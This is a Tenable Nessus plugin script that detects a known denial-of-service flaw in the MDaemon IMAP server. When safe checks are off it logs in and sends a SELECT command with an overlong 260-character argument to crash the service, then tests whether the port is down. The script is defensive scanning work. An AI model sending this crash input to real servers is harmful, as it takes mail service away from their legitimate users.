#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(14827);
 script_version("$Revision: 1.19 $");
 script_cvs_date("$Date: 2016/10/27 15:03:55 $");

 script_cve_id("CVE-2001-0584");
 script_bugtraq_id(2508);
 script_osvdb_id(12045);

 script_name(english:"MDaemon IMAP Server Multiple Command Local DoS");
 script_summary(english:"Crashes the remote imap server");

 script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by a denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote host is running the MDaemon IMAP server.

It is possible to crash the remote version of this software by sending
a too long argument to the 'SELECT' or 'EXAMINE' commands.

This problem allows an attacker to make the remote service crash, thus
preventing legitimate users from receiving emails.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Mar/398");
 script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:L/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/03/25");
 script_set_attribute(attribute:"plugin_publication_date", value:"2004/09/27");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
 script_family(english:"Windows");

 script_dependencie("find_service1.nasl", "sendmail_expn.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/imap", 143);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("imap_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_kb_item("Services/imap");
if(!port)port = 143;

acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

safe_checks = 0;
if((acct == "")||(pass == ""))safe_checks = 1;
if ( safe_checks() ) safe_checks = 1;

if ( safe_checks )
{
 banner = get_imap_banner ( port:port );
 if ( ! banner ) exit(0);
 #* OK company.mail IMAP4rev1 MDaemon 3.5.6 ready
 if(ereg(pattern:".* IMAP4.* MDaemon ([0-5]\.|6\.[0-7]\.) ready", string:banner)) security_note(port);
 exit(0);
}

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
    banner = recv_line(socket:soc, length:4096);
    if ("MDaemon" >!< banner ) exit(0);
    #need a valid account to test this issue
    s = string("? LOGIN ", acct, " ", pass, "\r\n");
    send(socket:soc, data:s);
    d = recv_line(socket:soc, length:4096);

    s = string("? SELECT ", crap(260), "\r\n");
    send(socket:soc, data:s);
    d = recv_line(socket:soc, length:4096);

    close(soc);

    soc2 = open_sock_tcp(port);
    if(!soc2)security_note(port);
    else close(soc2);
 }
}
